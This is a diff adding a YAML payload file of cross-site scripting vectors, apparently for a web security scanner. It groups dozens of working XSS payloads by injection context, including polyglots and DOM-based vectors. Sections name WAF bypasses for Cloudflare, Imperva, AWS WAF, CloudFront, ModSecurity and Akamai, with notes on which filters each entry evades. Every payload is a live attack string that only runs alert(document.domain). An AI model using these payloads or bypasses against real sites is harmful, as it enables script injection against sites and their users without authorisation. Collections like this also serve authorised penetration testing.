@@ -1,0 +1,358 @@
+# xss.yaml — Cross-Site Scripting payloads with WAF bypasses
+metadata:
+  version: "1.0"
+  sources:
+    - "AllAboutBugBounty/daffainfo"
+    - "PortSwigger XSS Cheat Sheet"
+    - "OWASP XSS Filter Evasion"
+    - "Brute Logic XSS"
+  last_updated: "2026-03-27"
+
+# ──────────────────────────────────────────────
+# CORE XSS TECHNIQUES (26+ distinct vectors)
+# ──────────────────────────────────────────────
+
+html_body:
+  - name: basic_script_tag
+    payload: "<script>alert(document.domain)</script>"
+    context: "HTML body injection where tags are not filtered"
+    notes: "Most basic XSS vector. Blocked by all WAFs. Use as baseline test."
+
+  - name: img_onerror
+    payload: "<img src=x onerror=alert(document.domain)>"
+    context: "HTML body where script tags are blocked but img is allowed"
+    notes: "Classic event handler XSS. Works when script tag is blacklisted."
+
+  - name: svg_onload
+    payload: "<svg onload=alert(document.domain)>"
+    context: "HTML body injection"
+    notes: "SVG elements support onload events. Often missed by simple filters."
+
+  - name: details_ontoggle
+    payload: "<details open ontoggle=alert(document.domain)>"
+    context: "HTML body injection"
+    notes: "The open attribute auto-triggers ontoggle. Less commonly filtered."
+
+  - name: body_onload
+    payload: "<body onload=alert(document.domain)>"
+    context: "When injecting near opening body tag or can close/reopen body"
+    notes: "Requires the body tag to be processed by browser."
+
+  - name: input_onfocus_autofocus
+    payload: "<input onfocus=alert(document.domain) autofocus>"
+    context: "HTML body injection"
+    notes: "Autofocus triggers onfocus immediately without user interaction."
+
+  - name: marquee_onstart
+    payload: "<marquee onstart=alert(document.domain)>"
+    context: "HTML body injection"
+    notes: "Deprecated but still works in most browsers. Rarely filtered."
+
+  - name: video_source_onerror
+    payload: "<video><source onerror=alert(document.domain)>"
+    context: "HTML body injection"
+    notes: "Nested source element error handler. Bypasses tag-level filters."
+
+  - name: math_xlink
+    payload: "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><img src=x onerror=alert(document.domain)>\">"
+    context: "HTML body with math namespace confusion"
+    notes: "Exploits HTML5 parser namespace switching between math and HTML."
+
+  - name: iframe_srcdoc
+    payload: "<iframe srcdoc='<script>alert(document.domain)</script>'>"
+    context: "HTML body where iframe is allowed"
+    notes: "srcdoc creates a new document context. Bypasses some CSP policies."
+
+  - name: object_data_javascript
+    payload: "<object data='javascript:alert(document.domain)'>"
+    context: "HTML body where object tag is not filtered"
+    notes: "Uses javascript: protocol in data attribute."
+
+  - name: embed_svg_xss
+    payload: "<embed src='data:image/svg+xml,<svg onload=alert(document.domain)>'>"
+    context: "HTML body where embed is allowed"
+    notes: "Embeds SVG with XSS via data URI."
+
+  - name: meta_refresh_javascript
+    payload: "<meta http-equiv='refresh' content='0;url=javascript:alert(document.domain)'>"
+    context: "When injecting into head section"
+    notes: "Works in some older browsers. Modern browsers may block javascript: in meta."
+
+attribute_context:
+  - name: attribute_escape_double_quote
+    payload: "\" onfocus=alert(document.domain) autofocus=\""
+    context: "Inside a double-quoted HTML attribute value"
+    notes: "Breaks out of attribute, adds event handler."
+
+  - name: attribute_escape_single_quote
+    payload: "' onfocus=alert(document.domain) autofocus='"
+    context: "Inside a single-quoted HTML attribute value"
+    notes: "Same technique for single-quoted attributes."
+
+  - name: attribute_no_quotes
+    payload: "x onfocus=alert(document.domain) autofocus"
+    context: "Inside an unquoted HTML attribute value"
+    notes: "Space breaks out of unquoted attribute value."
+
+javascript_string:
+  - name: js_string_breakout_single
+    payload: "';alert(document.domain);//"
+    context: "Inside a JavaScript single-quoted string"
+    notes: "Closes string, runs payload, comments out rest."
+
+  - name: js_string_breakout_double
+    payload: "\";alert(document.domain);//"
+    context: "Inside a JavaScript double-quoted string"
+    notes: "Closes string, runs payload, comments out rest."
+
+  - name: js_string_close_script
+    payload: "</script><script>alert(document.domain)</script>"
+    context: "Inside a script tag, any string context"
+    notes: "HTML parser takes priority over JS parser. Closes script tag."
+
+template_literal:
+  - name: template_literal_expression
+    payload: "${alert(document.domain)}"
+    context: "Inside JavaScript template literal (backtick string)"
+    notes: "Template literals run expressions in ${} blocks."
+
+  - name: template_literal_with_backtick
+    payload: "`-alert(document.domain)-`"
+    context: "Where backtick strings are used in JS"
+    notes: "Breaks out of template literal context."
+
+comment_escape:
+  - name: html_comment_escape
+    payload: "--><script>alert(document.domain)</script><!--"
+    context: "Inside an HTML comment"
+    notes: "Closes the comment, injects script, opens new comment."
+
+  - name: js_multiline_comment_escape
+    payload: "*/alert(document.domain);/*"
+    context: "Inside a JavaScript multi-line comment"
+    notes: "Closes multi-line comment, runs code, reopens comment."
+
+svg_specific:
+  - name: svg_animate
+    payload: "<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>"
+    context: "HTML body or SVG context"
+    notes: "SVG animate element supports onbegin event handler."
+
+  - name: svg_set
+    payload: "<svg><set onbegin=alert(document.domain) attributeName=x to=1>"
+    context: "HTML body or SVG context"
+    notes: "SVG set element also supports onbegin."
+
+markdown_xss:
+  - name: markdown_link_javascript
+    payload: "[click](javascript:alert(document.domain))"
+    context: "Markdown input that renders to HTML"
+    notes: "Many markdown parsers allow javascript: protocol in links."
+
+  - name: markdown_img_onerror
+    payload: "![x](x \"onerror=alert(document.domain)\")"
+    context: "Markdown image with attribute injection"
+    notes: "Depends on parser. Works when title is placed in img tag attribute."
+
+xml_xss:
+  - name: xml_cdata_script
+    payload: "<![CDATA[<script>alert(document.domain)</script>]]>"
+    context: "XML/XHTML context where CDATA is processed"
+    notes: "CDATA sections can contain unescaped content in XML."
+
+  - name: xml_entity_injection
+    payload: "<x xmlns:xlink='http://www.w3.org/1999/xlink'><a xlink:href='javascript:alert(document.domain)'><text>click</text></a></x>"
+    context: "SVG/XML context with namespace support"
+    notes: "Uses XLink namespace for javascript: protocol."
+
+polyglot:
+  - name: polyglot_universal
+    payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>"
+    context: "Universal polyglot - works in multiple injection contexts"
+    notes: "Covers script, attribute, URL, and HTML body contexts simultaneously."
+
+  - name: polyglot_img_svg
+    payload: "<img src=x onerror=alert(document.domain)><svg/onload=alert(document.domain)>"
+    context: "HTML body - dual vector for redundancy"
+    notes: "If one is filtered the other may fire."
+
+dom_based:
+  - name: dom_hash_injection
+    payload: "#<img src=x onerror=alert(document.domain)>"
+    context: "URL fragment when page reads location.hash and writes to DOM"
+    notes: "Fragment is not sent to server, bypasses server-side WAFs."
+
+  - name: dom_postmessage
+    payload: "<script>window.postMessage('<img src=x onerror=alert(document.domain)>','*')</script>"
+    context: "When target page listens to postMessage without origin check"
+    notes: "Exploits insecure postMessage handler."
+
+# ──────────────────────────────────────────────
+# WAF BYPASS PAYLOADS (Provider-Specific)
+# ──────────────────────────────────────────────
+
+waf_bypass_cloudflare:
+  - name: cf_svg_animate
+    payload: "<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>"
+    context: "HTML body behind Cloudflare WAF"
+    notes: "SVG animate events often bypass Cloudflare regex patterns."
+
+  - name: cf_details_ontoggle
+    payload: "<details open ontoggle=alert(document.domain)>"
+    context: "HTML body behind Cloudflare WAF"
+    notes: "ontoggle is less commonly in Cloudflare rulesets."
+
+  - name: cf_encoded_tag
+    payload: "<svg/onload=alert(document.domain)>"
+    context: "HTML body behind Cloudflare WAF"
+    notes: "Slash instead of space between tag and attribute."
+
+  - name: cf_constructor_alert
+    payload: "<img src=x onerror=alert.call(null,document.domain)>"
+    context: "HTML body behind Cloudflare WAF"
+    notes: "Using .call() to invoke alert bypasses alert() pattern matching."
+
+  - name: cf_top_number_obfuscation
+    payload: "<img src=x onerror=top[8680439..toString(30)](document.domain)>"
+    context: "HTML body behind Cloudflare WAF"
+    notes: "8680439 in base30 is 'alert'. Numeric obfuscation bypasses keyword detection."
+
+  - name: cf_setTimeout_tagged
+    payload: "<img src=x onerror=setTimeout`alert\\x28document.domain\\x29`>"
+    context: "HTML body behind Cloudflare WAF"
+    notes: "Tagged template literal with hex-encoded parens bypasses pattern matching."
+
+waf_bypass_imperva:
+  - name: imperva_double_url_encode
+    payload: "<img src=x onerror=%2561lert(document.domain)>"
+    context: "HTML body behind Imperva WAF"
+    notes: "Double URL encoding: %25 decodes to %, then %61 decodes to 'a'. Imperva may decode only once."
+
+  - name: imperva_null_byte
+    payload: "<scr%00ipt>alert(document.domain)</scr%00ipt>"
+    context: "HTML body behind Imperva WAF"
+    notes: "Null bytes can break Imperva regex matching while browser ignores them."
+
+  - name: imperva_unicode_escape
+    payload: "<img src=x onerror=\\u0061lert(document.domain)>"
+    context: "HTML body behind Imperva WAF"
+    notes: "JavaScript Unicode escapes in event handlers bypass keyword detection."
+
+  - name: imperva_concat_window
+    payload: "<img src=x onerror=window['al'+'ert'](document.domain)>"
+    context: "HTML body behind Imperva WAF"
+    notes: "String concatenation to construct function name dynamically."
+
+waf_bypass_aws_waf:
+  - name: aws_waf_case_variation
+    payload: "<ScRiPt>alert(document.domain)</ScRiPt>"
+    context: "HTML body behind AWS WAF with default rules"
+    notes: "Default AWS WAF rules may use case-sensitive matching."
+
+  - name: aws_waf_tab_break
+    payload: "<img/src=x\tonerror=alert(document.domain)>"
+    context: "HTML body behind AWS WAF"
+    notes: "Tab character between attributes bypasses space-based pattern matching."
+
+  - name: aws_waf_newline_break
+    payload: "<img src=x\nonerror=alert(document.domain)>"
+    context: "HTML body behind AWS WAF"
+    notes: "Newline character between attributes bypasses single-line regex."
+
+  - name: aws_waf_svg_use
+    payload: "<svg><use href='data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=1 onerror=alert(document.domain) /></svg>#x'>"
+    context: "HTML body behind AWS WAF"
+    notes: "SVG use element with data URI creates nested context."
+
+waf_bypass_cloudfront:
+  - name: cloudfront_encoding_mix
+    payload: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(document.domain)>"
+    context: "HTML body behind CloudFront"
+    notes: "HTML entity encoding of JavaScript function names."
+
+  - name: cloudfront_fromCharCode
+    payload: "<img src=x onerror=String.fromCharCode(97,108,101,114,116)>"
+    context: "HTML body behind CloudFront"
+    notes: "Build payload string from char codes to bypass keyword detection."
+
+  - name: cloudfront_atob
+    payload: "<img src=x onerror=window[atob('YWxlcnQ=')](document.domain)>"
+    context: "HTML body behind CloudFront"
+    notes: "Base64 encoded function name: atob('YWxlcnQ=') = 'alert'. Decoded at runtime."
+
+waf_bypass_modsecurity:
+  - name: modsec_comment_split
+    payload: "<script>al/**/ert(document.domain)</script>"
+    context: "HTML body behind ModSecurity CRS"
+    notes: "JS comments inside function name. Browser ignores comments in some contexts."
+
+  - name: modsec_nested_tags
+    payload: "<<script>alert(document.domain)//<</script>"
+    context: "HTML body behind ModSecurity CRS"
+    notes: "Double angle bracket confuses ModSecurity parser but browser recovers."
+
+  - name: modsec_event_handler_obfuscation
+    payload: "<img src=x onerror='var a=\"al\";var b=\"ert\";window[a+b](document.domain)'>"
+    context: "HTML body behind ModSecurity CRS"
+    notes: "Variable-based string construction avoids keyword matching."
+
+  - name: modsec_paranoia_level_bypass
+    payload: "<svg/onload=self['ale'+'rt'](document.domain)>"
+    context: "HTML body behind ModSecurity CRS at paranoia level 1-2"
+    notes: "At lower paranoia levels, self[] access pattern is not blocked."
+
+waf_bypass_akamai:
+  - name: akamai_prototype_access
+    payload: "<img src=x onerror=window.onerror=alert;throw+document.domain>"
+    context: "HTML body behind Akamai Kona WAF"
+    notes: "Assigns alert to onerror handler, then throws domain as error."
+
+  - name: akamai_constructor
+    payload: "<img src=x onerror=[].constructor.constructor('alert(document.domain)')()>"
+    context: "HTML body behind Akamai Kona WAF"
+    notes: "Accesses Function constructor via array prototype chain."
+
+  - name: akamai_location_hash
+    payload: "<img src=x onerror=location.hash.slice(1)>#alert(document.domain)"
+    context: "URL with hash payload, behind Akamai Kona WAF"
+    notes: "Payload in URL fragment, not inspected by WAF."
+
+  - name: akamai_dynamic_import
+    payload: "<img src=x onerror=import('data:text/javascript,alert(document.domain)')>"
+    context: "HTML body behind Akamai Kona WAF"
+    notes: "Dynamic import with data URI. Bypasses static analysis."
+
+# ──────────────────────────────────────────────
+# ENCODING & EVASION TECHNIQUES
+# ──────────────────────────────────────────────
+
+encoding_techniques:
+  - name: html_entity_decimal
+    payload: "&#60;script&#62;alert(document.domain)&#60;/script&#62;"
+    context: "Where HTML entities are decoded before rendering"
+    notes: "Decimal HTML entities for angle brackets."
+
+  - name: html_entity_hex
+    payload: "&#x3c;script&#x3e;alert(document.domain)&#x3c;/script&#x3e;"
+    context: "Where HTML entities are decoded before rendering"
+    notes: "Hexadecimal HTML entities."
+
+  - name: javascript_unicode
+    payload: "\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e"
+    context: "Inside JavaScript string that is written to DOM"
+    notes: "JavaScript Unicode escape sequences."
+
+  - name: url_encoding
+    payload: "%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
+    context: "URL parameter that is reflected without decoding"
+    notes: "Standard URL encoding of angle brackets."
+
+  - name: double_url_encoding
+    payload: "%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E"
+    context: "Where server decodes URL once but filter checks before second decode"
+    notes: "Double encoding bypasses single-decode filters."
+
+  - name: mixed_case_evasion
+    payload: "<ScRiPt>alert(document.domain)</ScRiPt>"
+    context: "Where filters use case-sensitive matching"
+    notes: "HTML tags are case-insensitive but some filters are not."
